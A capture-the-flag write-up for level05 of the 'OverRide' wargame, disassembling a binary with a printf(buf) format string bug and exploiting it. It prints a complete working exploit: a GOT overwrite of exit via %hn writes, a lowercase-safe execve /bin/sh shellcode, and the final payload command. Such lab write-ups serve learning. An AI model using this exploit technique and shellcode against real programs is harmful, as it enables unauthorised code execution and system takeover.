#steps
---
- ### Functions used in this program.
    ```c
    0x080482f8  _init
    0x08048340  printf
    0x08048350  fgets
    0x08048360  __gmon_start__
    0x08048370  exit
    0x08048370  exit@plt
    0x08048380  __libc_start_main
    0x08048390  _start
    0x080483c0  __do_global_dtors_aux
    0x08048420  frame_dummy
    0x08048444  main
    0x08048520  __libc_csu_init
    0x08048590  __libc_csu_fini
    0x08048592  __i686.get_pc_thunk.bx
    0x080485a0  __do_global_ctors_aux
    0x080485cc  _fini
    ```

- ### Assembly code of `main`.
    ```c
    0x08048444 <+0>:     push   %ebp
    0x08048445 <+1>:     mov    %esp,%ebp
    0x08048447 <+3>:     push   %edi
    0x08048448 <+4>:     push   %ebx
    0x08048449 <+5>:     and    $0xfffffff0,%esp
    0x0804844c <+8>:     sub    $0x90,%esp
    0x08048452 <+14>:    movl   $0x0,0x8c(%esp)
    0x0804845d <+25>:    mov    0x80497f0,%eax
    0x08048462 <+30>:    mov    %eax,0x8(%esp)
    0x08048466 <+34>:    movl   $0x64,0x4(%esp)
    0x0804846e <+42>:    lea    0x28(%esp),%eax
    0x08048472 <+46>:    mov    %eax,(%esp)
    0x08048475 <+49>:    call   0x8048350 <fgets@plt>
    0x0804847a <+54>:    movl   $0x0,0x8c(%esp)
    0x08048485 <+65>:    jmp    0x80484d3 <main+143>
    0x08048487 <+67>:    lea    0x28(%esp),%eax
    0x0804848b <+71>:    add    0x8c(%esp),%eax
    0x08048492 <+78>:    movzbl (%eax),%eax
    0x08048495 <+81>:    cmp    $0x40,%al
    0x08048497 <+83>:    jle    0x80484cb <main+135>
    0x08048499 <+85>:    lea    0x28(%esp),%eax
    0x0804849d <+89>:    add    0x8c(%esp),%eax
    0x080484a4 <+96>:    movzbl (%eax),%eax
    0x080484a7 <+99>:    cmp    $0x5a,%al
    0x080484a9 <+101>:   jg     0x80484cb <main+135>
    0x080484ab <+103>:   lea    0x28(%esp),%eax
    0x080484af <+107>:   add    0x8c(%esp),%eax
    0x080484b6 <+114>:   movzbl (%eax),%eax
    0x080484b9 <+117>:   mov    %eax,%edx
    0x080484bb <+119>:   xor    $0x20,%edx
    0x080484be <+122>:   lea    0x28(%esp),%eax
    0x080484c2 <+126>:   add    0x8c(%esp),%eax
    0x080484c9 <+133>:   mov    %dl,(%eax)
    0x080484cb <+135>:   addl   $0x1,0x8c(%esp)
    0x080484d3 <+143>:   mov    0x8c(%esp),%ebx
    0x080484da <+150>:   lea    0x28(%esp),%eax
    0x080484de <+154>:   movl   $0xffffffff,0x1c(%esp)
    0x080484e6 <+162>:   mov    %eax,%edx
    0x080484e8 <+164>:   mov    $0x0,%eax
    0x080484ed <+169>:   mov    0x1c(%esp),%ecx
    0x080484f1 <+173>:   mov    %edx,%edi
    0x080484f3 <+175>:   repnz scas %es:(%edi),%al
    0x080484f5 <+177>:   mov    %ecx,%eax
    0x080484f7 <+179>:   not    %eax
    0x080484f9 <+181>:   sub    $0x1,%eax
    0x080484fc <+184>:   cmp    %eax,%ebx
    0x080484fe <+186>:   jb     0x8048487 <main+67>
    0x08048500 <+188>:   lea    0x28(%esp),%eax
    0x08048504 <+192>:   mov    %eax,(%esp)
    0x08048507 <+195>:   call   0x8048340 <printf@plt>
    0x0804850c <+200>:   movl   $0x0,(%esp)
    0x08048513 <+207>:   call   0x8048370 <exit@plt>
    ```
    #### Unforuntly the program uses `fgets` not `gets` so there is no buffer overflow.

    #### But we still have agood news the `printf` didn't use any format so in worh like this `printf(buf)`.
    ```c
    0x080484fe <+186>:   jb     0x8048487 <main+67>
    0x08048500 <+188>:   lea    0x28(%esp),%eax
    0x08048504 <+192>:   mov    %eax,(%esp)
    0x08048507 <+195>:   call   0x8048340 <printf@plt> // no format pushed to esp before.
    0x0804850c <+200>:   movl   $0x0,(%esp)
    0x08048513 <+207>:   call   0x8048370 <exit@plt>
    ```
    #### At the end of assembly there is no `return` as before there is a `exit`, so we need to think in other solution and not return address overwrite.
    ```c
    0x0804850c <+200>:   movl   $0x0,(%esp)
    0x08048513 <+207>:   call   0x8048370 <exit@plt>
    ```
    


- ## Source code.
    ```c
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>

    int main() {
        char buf[100];
        int i;

        // Read up to 100 bytes safely
        fgets(buf, 100, stdin);

        // Loop through the string and lower-case all uppercase letters
        for (i = 0; i < strlen(buf); i++) {
            if (buf[i] > 0x40 && buf[i] <= 0x5A) { // If character is between 'A' and 'Z'
                buf[i] = buf[i] ^ 0x20;            // Convert to lowercase
            }
        }

        // THE VULNERABILITY: Format string bug
        printf(buf); 

        exit(0);
    }
    ```

- ### Solution.
    #### Try to overwrite the address of exit in GOT.

    #### `0x080497e0` address of exit in GOT, littel indine `\xe0\x97\x04\x08`
    ```c
    level05@OverRide:~$ objdump -R level05 | grep exit
    080497e0 R_386_JUMP_SLOT   exit
    ```

    #### Find the offset of our `buffer` in the stack, its `10`.
    ```c
    level05@OverRide:~$ (python -c 'print("aaaa %10$x ")')| ./level05 
    aaaa 61616161
    ```

    #### The address of our `buffer` is `0xffffd6a8`, (inside gdb).
    ```c
    (gdb) r < <(python -c 'print("aaaaaa")')
    The program being debugged has been started already.
    Start it from the beginning? (y or n) y
    Starting program: /home/users/level05/level05 < <(python -c 'print("aaaaaa")')
    aaaaaa

    Breakpoint 1, 0x0804850c in main ()
    (gdb) x/24wx $esp
    0xffffd680:     0xffffd6a8      0x00000064      0xf7fcfac0      0xf7ec3af9
    0xffffd690:     0xffffd6cf      0xffffd6ce      0x00000000      0xffffffff
    0xffffd6a0:     0xffffd754      0x00000000  --> 0x61616161      0x000a6161
    0xffffd6b0:     0x08048271      0x00000000      0x00c30000      0x00000001
    0xffffd6c0:     0xffffd8d3      0x0000002f      0xffffd71c      0xf7fceff4
    0xffffd6d0:     0x08048520      0x080497c8      0x00000001      0x08048321
    ```

    #### After doing some checks, the addresses change outside of `gdb`. To verify how the check works, I write the address that we find by `gdb` after four 'a's, so it is at offset `11`. I then use `%11$s` to print the value of this address. If it is indeed the address of our `buffer`, it will print the four 'a's and the other characters that i write.
    ```c
    level05@OverRide:~$ (python -c 'print("aaaa"+"\xa8\xd6\xff\xff"+" ->%11$s")') | /home/users/level05/level05
    aaaa���� ->�������� ȗ
    ```
    #### After trying some addresses close to `0xffffd6a8` i find the correct address outside gdb, its the address `0xffffd688`.
    ```c
    level05@OverRide:~$ (python -c 'print("aaaa"+"\x88\xd6\xff\xff"+" ->%11$s")') | /home/users/level05/level05
    aaaa���� ->aaaa���� ->%11$s
    ```

    #### Shell code,  i use a shell code that didn't use uper cases because the program will change upper to lower if they exist and the instruction will not work.
    `\x31\xc0\x83\xec\x04\x89\x04\x24\x83\xec\x04\xc7\x04\x24\x2f\x2f\x73\x68\x83\xec\x04\xc7\x04\x24\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80`

    #### Final command.
    ```c
    (python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "\x31\xc0\x83\xec\x04\x89\x04\x24\x83\xec\x04\xc7\x04\x24\x2f\x2f\x73\x68\x83\xec\x04\xc7\x04\x24\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80" + "%54882x%10$hn%10607x%11$hn")'; cat) | /home/users/level05/level05
    ``` 